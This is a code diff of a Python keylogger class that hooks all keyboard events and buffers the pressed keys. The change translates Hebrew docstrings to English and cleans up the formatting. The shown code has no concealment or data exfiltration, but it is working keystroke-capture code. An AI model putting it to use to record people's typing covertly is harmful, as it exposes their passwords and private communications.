@@ -3,37 +3,33 @@ import keyboard
 
 
 class KeyLoggerService(IKeyLoggerService):
+    """Implementation of a class for key logging using the 'keyboard' library."""
 
-    """  מימוש מחלקה להקלטת מקשים בשימוש בספריית keyboard """
+    """Creating a variable to store the pressed keys."""
 
-
-    """" יצירת משתנה לשמירת המקשים שנלחצו """
     def __init__(self):
         self.keys = []
 
-
-    """"  פונקציה שתפעל בהקשה על מקש """
     def _on_event(self, event):
+        """Function that triggers on key press."""
         if event.event_type == keyboard.KEY_DOWN:
             key = event.name
-            if len(key)> 1:
+            if len(key) > 1:
                 key = f"[{key}]"
             self.keys.append(key)
+        elif len(event.name) > 1 and event.event_type == keyboard.KEY_UP:
+            self.keys.append(f"[{event.name} END]")
 
-        elif len(event.name)>1 and event.event_type == keyboard.KEY_UP:
-                self.keys.append( f"[{event.name} END]")
-                
-    """" פונקציה להתחלת הקלטה"""
-    def start_logging(self)-> None:
+    def start_logging(self) -> None:
+        """Function to start logging."""
         keyboard.hook(self._on_event)
 
-    """ פונקציה לסיום הקלטה"""
     def stop_logging(self):
+        """Function to stop logging."""
         keyboard.unhook_all()
 
-    """ פונקציה לקבלת המקשים שנלחצו"""
-
     def get_logged_keys(self) -> list:
+        """Function to get the pressed keys."""
         requested_keys = self.keys
         self.keys = []
         return requested_keys
